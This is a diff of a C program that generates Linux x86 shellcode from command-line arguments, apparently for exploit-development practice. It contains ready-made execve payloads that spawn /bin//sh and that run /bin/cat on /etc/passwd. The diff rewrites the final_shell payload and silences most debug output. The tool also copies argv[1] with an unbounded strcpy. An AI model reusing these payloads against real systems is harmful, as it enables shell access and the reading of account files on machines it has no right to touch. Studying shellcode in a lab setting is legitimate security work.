@@ -7,11 +7,10 @@ char my_code[1024];
 char *shellcode1_p1 = "\\x31\\xc0\\x50";
 char *shellcode2_p1 = "\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\xb0\\x01\\x31\\xdb\\xcd\\x80";
 char *bash_shell = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80";
-	    	//	\x31\xc0\x99\x52\x68\x2F\x63\x61\x74\x68\x2F\x62\x69\x6E\x89\xe3\x52\x68\x73\x73\x77\x64\x68\x2F\x2F\x70\x61\x68\x2F\x65\x74\x63\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80
 char *my_cat = 		"\x31\xc0\x99\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80";
-char *final_shell = "\x31\xc0\x99\x52\x68\x6E\x2F\x6C\x73\x68\x2F\x2F\x62\x69\x89\xe3\x52\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80";
 
-char *my_cat_esc = "\\x31\\xc0\\x99\\x52\\x68\\x2f\\x63\\x61\\x74\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x68\\x73\\x73\\x77\\x64\\x68\\x2f\\x2f\\x70\\x61\\x68\\x2f\\x65\\x74\\x63\\x89\\xe1\\xb0\\x0b\\x52\\x51\\x53\\x89\\xe1\\xcd\\x80";
+char *final_shell = "\x31\xc0\x99\x52\x68\x2F\x63\x61\x74\x68\x2F\x62\x69\x6E\x89\xe3\x52\x68\x73\x73\x77\x64\x68\x63\x2F\x70\x61\x68\x2F\x2F\x65\x74\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80";
+
 char *shellcode1 = "\\x31\\xc0\\x99\\x52";
 char *shellcode2 = "\\x89\\xe3\\x52";
 char *shellcode3 = "\\x89\\xe1\\xb0\\x0b\\x52\\x51\\x53\\x89\\xe1\\xcd\\x80";
@@ -94,7 +93,7 @@ char* main(int argc, char * argv[])
     }
     strcpy(ascii, argv[1]);
     
-//    printf("%s %d\n",ascii,strlen(ascii));
+
     tokens = strtok(ascii, " ");
     while(tokens != NULL){
     	strcpy(data[n_param], tokens);
@@ -102,35 +101,34 @@ char* main(int argc, char * argv[])
 	    n_param++;
 	}
 
-//////////////////////////////CHECK SEG FAULT///////////////////////////////////
 	if(n_param == 1){
 		strcpy(my_code, "");
 		strcpy(my_code, shellcode1_p1);
-		printf("%s\n", data[0]);
+//		printf("%s\n", data[0]);
 		val = convert(data[0]);
-		printf("%s\n",val);
+//		printf("%s\n",val);
 		for(i=strlen(val)-4; i>=0; i-=4) {
 			for(j=0; j<4; j++) {
 				code[j] = val[i+j];
 			}
 			code[j]='\0';
 			strcat(my_code, "\\x68");
-			printf("GET HEX: %s\n",code);				
+//			printf("GET HEX: %s\n",code);				
 			getHex(code, output);
-			printf("%s\n",output);
+//			printf("%s\n",output);
 			strcat(my_code, output);
-			printf("%s\n",my_code);
+//			printf("%s\n",my_code);
 		}
 		strcat(my_code, shellcode2_p1);	
 	}
 	else{
 	strcpy(my_code, "");
 	strcpy(my_code, shellcode1);
-	printf("%s\n", my_code);
+//	printf("%s\n", my_code);
 	for(p=0; p<n_param; p++){
 		printf("%s\n",data[p]);
 		val = convert(data[p]);
-		printf("%s\n",val);		
+//		printf("%s\n",val);		
 		if(p==0){
 			for(i=strlen(val)-4; i>=0; i-=4) {
 				for(j=0; j<4; j++) {
@@ -138,11 +136,11 @@ char* main(int argc, char * argv[])
 				}
 				code[j]='\0';
 				strcat(my_code, "\\x68");
-				printf("GET HEX: %s\n",code);				
+//				printf("GET HEX: %s\n",code);				
 				getHex(code, output);
-				printf("%s\n",output);
+//				printf("%s\n",output);
 				strcat(my_code, output);
-				printf("%s\n",my_code);
+//				printf("%s\n",my_code);
 			}
 		}
 		else{
@@ -153,11 +151,11 @@ char* main(int argc, char * argv[])
 				}
 				code[j]='\0';
 				strcat(my_code, "\\x68");
-				printf("GET HEX: %s\n",code);
+//				printf("GET HEX: %s\n",code);
 				
 				getHex(code, output);
 				strcat(my_code, output);
-				printf("%s\n",my_code);
+//				printf("%s\n",my_code);
 			}	
 		}
 	}
